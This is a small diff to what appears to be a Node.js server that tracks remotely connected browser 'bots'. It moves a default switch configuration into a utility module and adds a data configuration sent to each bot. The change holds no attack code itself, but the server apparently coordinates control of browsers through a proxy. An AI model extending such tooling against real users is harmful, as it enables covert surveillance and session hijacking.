@@ -21,6 +21,10 @@ const axios = require("axios");
 
 const get_secure_random_string = require("./utils.js").get_secure_random_string;
 const logit = require("./utils.js").logit;
+const BOT_DEFAULT_SWITCH_CONFIG =
+  require("./utils.js").BOT_DEFAULT_SWITCH_CONFIG;
+
+const BOT_DEFAULT_DATA_CONFIG = require("./utils.js").BOT_DEFAULT_DATA_CONFIG;
 
 const get_api_server = require("./api-server.js").get_api_server;
 
@@ -37,13 +41,6 @@ const PROXY_PORT = process.env.PROXY_PORT || 8080;
 const WS_PORT = process.env.WS_PORT || 4343;
 const API_SERVER_PORT = process.env.API_SERVER_PORT || 8118;
 const SERVER_VERSION = "1.0.0";
-
-const BOT_DEFAULT_SWITCH_CONFIG = {
-  SYNC: true,
-  SYNC_HUGE: true,
-  REALTIME_IMG: false,
-  NOTIFICATION: false,
-};
 
 const RPC_CALL_TABLE = {
   PING: ping,
@@ -143,6 +140,7 @@ async function pong_and_get_bot(websocket_connection) {
       action: "PONG",
       data: {
         switch_config: bot.switch_config,
+        data_config: bot.data_config,
       },
     })
   );
@@ -611,6 +609,7 @@ async function initialize_new_browser_connection(ws) {
       downloads: [],
       recording: [],
       switch_config: BOT_DEFAULT_SWITCH_CONFIG,
+      data_config: BOT_DEFAULT_DATA_CONFIG,
       last_online: new Date(),
       state: "",
     });
